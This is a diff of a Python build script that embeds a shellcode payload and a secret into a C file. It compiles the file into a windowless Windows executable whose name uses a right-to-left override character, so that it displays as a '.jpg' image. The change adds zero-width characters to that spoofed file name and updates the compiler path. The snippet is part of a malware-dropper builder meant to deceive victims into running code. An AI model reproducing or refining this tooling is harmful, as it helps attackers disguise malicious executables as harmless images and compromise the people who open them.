@@ -52,7 +52,6 @@ def create_temp_c_file(p: pathlib.Path, payload: str, secret: str, temp_file_nam
         splitted = c_file_content.split("//SCRIPT COMES HERE")
         new_content = f"\nchar sc[] = {payload};\nchar s[] = \"{secret}\";\n".join(splitted)
     with open(f"{p}\\..\\build\\{temp_file_name}",'w') as f:
-        print(new_content)
         f.write(new_content)
 
 def replace_args(script: str, arguments: dict):
@@ -64,7 +63,7 @@ def get_temp_name():
     return f"temp_{int(time.time())}.c"
     
 def compile(p: pathlib.Path, c_temp_file: str, output_jpg_name: str):
-    process = subprocess.Popen(f'C:\\"Program Files (x86)"\\"Microsoft Visual Studio"\\2022\\BuildTools\\Common7\\Tools\\VsDevCmd.bat && windres ..\\resources\\resources.rc -O coff --target pe-i386 -o ..\\resources\\resources.res && cl ..\\build\\{c_temp_file} ..\\resources\\resources.res /DEBUG:NONE /link /subsystem:windows /entry:mainCRTStartup /out:\"{p}\\..\\build\\{output_jpg_name}‮gpj.exe\"', shell=True, env=os.environ, cwd=f'{p}\\..\\src')
+    process = subprocess.Popen(f'"C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Common7\\Tools\\VsDevCmd.bat" && windres ..\\resources\\resources.rc -O coff --target pe-i386 -o ..\\resources\\resources.res && cl ..\\build\\{c_temp_file} ..\\resources\\resources.res /DEBUG:NONE /link /subsystem:windows /entry:mainCRTStartup /out:\"{p}\\..\\build\\{output_jpg_name}‮gpj​​.exe\"', shell=True, env=os.environ, cwd=f'{p}\\..\\src')
     process.wait()
     os.remove(f"{p}\\..\\build\\{c_temp_file}")
     temp_obj_file = c_temp_file.split(".")[0] + ".obj"
